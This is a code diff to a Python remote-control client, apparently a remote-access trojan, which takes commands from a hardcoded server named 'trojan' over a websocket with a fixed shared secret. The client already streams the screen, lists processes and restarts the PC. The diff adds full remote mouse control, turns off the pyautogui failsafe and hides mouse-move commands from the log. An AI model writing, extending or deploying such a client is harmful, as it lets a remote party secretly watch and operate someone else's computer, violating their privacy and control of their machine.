@@ -23,6 +23,15 @@ try:
 except ImportError:
     HAS_MSS = False
 
+try:
+    import pyautogui
+    HAS_PYAUTOGUI = True
+except Exception:
+    pyautogui = None
+    HAS_PYAUTOGUI = False
+
+MOUSE_ACTIONS = {"mouse_move", "mouse_click", "mouse_down", "mouse_up", "mouse_scroll"}
+
 if getattr(sys, 'frozen', False):
     BASE_DIR = os.path.dirname(sys.executable)
 else:
@@ -38,6 +47,26 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger("PC-Client")
+
+if HAS_PYAUTOGUI:
+    # Прибираємо штучні паузи та вимикаємо аварійний кут (миша має доходити у будь-яку точку)
+    pyautogui.PAUSE = 0.001
+    pyautogui.FAILSAFE = False
+
+
+def init_platform():
+    """Готує платформу перед запуском (DPI-сумісність зі скріншотами на Windows)."""
+    if "windows" not in platform.system().lower():
+        return
+    try:
+        import ctypes
+        try:
+            ctypes.windll.shcore.SetProcessDpiAwareness(2)  # PROCESS_PER_MONITOR_DPI_AWARE
+        except Exception:
+            ctypes.windll.user32.SetProcessDPIAware()
+    except Exception:
+        pass
+
 
 DEFAULT_SERVER_URL = "wss://trojan-y9he.onrender.com/ws/client"
 DEFAULT_SECRET = "super_secret_club_key_2026"
@@ -239,9 +268,92 @@ def show_fullscreen_image(img_bytes: bytes, duration: float):
 
 is_streaming = False
 stream_task = None
+# Геометрія монітора, який зараз транслюється — потрібна для точного перерахунку координат миші
+stream_monitor = None
+
+
+def clamp_rel(value, fallback: float = 0.5) -> float:
+    """Нормалізує відносну координату з браузера до діапазону 0.0–1.0."""
+    try:
+        v = float(value)
+    except (TypeError, ValueError):
+        return fallback
+    return min(1.0, max(0.0, v))
+
+
+def rel_to_screen(rel_x, rel_y):
+    """Переводить відносні координати картинки (0.0–1.0) у пікселі монітора, що транслюється."""
+    if stream_monitor:
+        left = stream_monitor["left"]
+        top = stream_monitor["top"]
+        width = stream_monitor["width"]
+        height = stream_monitor["height"]
+    else:
+        width, height = pyautogui.size()
+        left = top = 0
+    x = int(left + clamp_rel(rel_x) * (width - 1))
+    y = int(top + clamp_rel(rel_y) * (height - 1))
+    return x, y
+
+
+def normalize_button(button) -> str:
+    b = str(button or "left").strip().lower()
+    return b if b in ("left", "right", "middle") else "left"
+
+
+def perform_mouse_action(action: str, params: dict) -> dict:
+    """
+    Виконує дію миші на локальному ПК.
+    Синхронно (без потоку), щоб порядок подій drag & drop не порушувався.
+    """
+    if not HAS_PYAUTOGUI:
+        return {"status": "error", "message": "Бібліотека pyautogui не встановлена на цьому ПК"}
+
+    button = normalize_button(params.get("button"))
+    has_coords = params.get("x") is not None and params.get("y") is not None
+
+    if action == "mouse_move":
+        x, y = rel_to_screen(params.get("x", 0.5), params.get("y", 0.5))
+        pyautogui.moveTo(x, y, _pause=False)
+
+    elif action == "mouse_scroll":
+        try:
+            delta_y = float(params.get("delta_y") or 0)
+        except (TypeError, ValueError):
+            delta_y = 0.0
+        # Одна сходинка колеса у браузері ≈ 100 одиниць deltaY (додатні — вниз)
+        clicks = int(-delta_y / 100)
+        if clicks == 0:
+            clicks = 1 if delta_y < 0 else -1
+        pyautogui.scroll(clicks, _pause=False)
+
+    elif action in ("mouse_click", "mouse_down", "mouse_up"):
+        if has_coords:
+            x, y = rel_to_screen(params.get("x"), params.get("y"))
+            pyautogui.moveTo(x, y, _pause=False)
+
+        if action == "mouse_click":
+            try:
+                clicks = max(1, min(3, int(params.get("clicks") or 1)))
+            except (TypeError, ValueError):
+                clicks = 1
+            if has_coords:
+                pyautogui.click(x=x, y=y, button=button, clicks=clicks, _pause=False)
+            else:
+                pyautogui.click(button=button, clicks=clicks, _pause=False)
+        elif action == "mouse_down":
+            pyautogui.mouseDown(button=button, _pause=False)
+        else:
+            pyautogui.mouseUp(button=button, _pause=False)
+
+    else:
+        return {"status": "error", "message": f"Невідома дія миші: {action}"}
+
+    return {"status": "ok"}
+
 
 async def stream_loop(websocket, target_fps=8):
-    global is_streaming
+    global is_streaming, stream_monitor
     logger.info(f"Початок трансляції екрану ({target_fps} FPS)...")
     delay = max(0.04, 1.0 / target_fps)
     sct = mss.mss() if HAS_MSS else None
@@ -257,6 +369,13 @@ async def stream_loop(websocket, target_fps=8):
                     img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                 else:
                     img = ImageGrab.grab()
+
+                stream_monitor = {
+                    "left": offset_x,
+                    "top": offset_y,
+                    "width": img.width,
+                    "height": img.height
+                }
 
                 orig_w, orig_h = img.width, img.height
                 ratio = 1.0
@@ -347,6 +466,9 @@ async def execute_action(action: str, params: dict, websocket=None) -> dict:
         elif action == "list_processes":
             return {"status": "ok", "processes": get_process_list()}
 
+        elif action in MOUSE_ACTIONS:
+            return perform_mouse_action(action, params)
+
         elif action == "restart":
             asyncio.get_event_loop().call_later(1.0, execute_restart)
             return {"status": "ok", "message": "ПК перезавантажується..."}
@@ -412,14 +534,16 @@ async def run_client():
                             req_id = msg.get("request_id")
                             action = msg.get("action")
                             params = msg.get("params", {})
-                            logger.info(f"Отримано команду: {action}")
+                            if action != "mouse_move":
+                                logger.info(f"Отримано команду: {action}")
                             result = await execute_action(action, params, websocket=websocket)
 
-                            await websocket.send(json.dumps({
-                                "type": "response",
-                                "request_id": req_id,
-                                **result
-                            }))
+                            if req_id:
+                                await websocket.send(json.dumps({
+                                    "type": "response",
+                                    "request_id": req_id,
+                                    **result
+                                }))
                         except json.JSONDecodeError:
                             logger.warning(f"Невірний формат повідомлення: {message_str}")
                 finally:
@@ -434,6 +558,9 @@ async def run_client():
             await asyncio.sleep(5)
 
 if __name__ == "__main__":
+    init_platform()
+    if not HAS_PYAUTOGUI:
+        logger.warning("pyautogui не знайдено — керування мишею буде недоступне (pip install pyautogui)")
     try:
         asyncio.run(run_client())
     except KeyboardInterrupt:
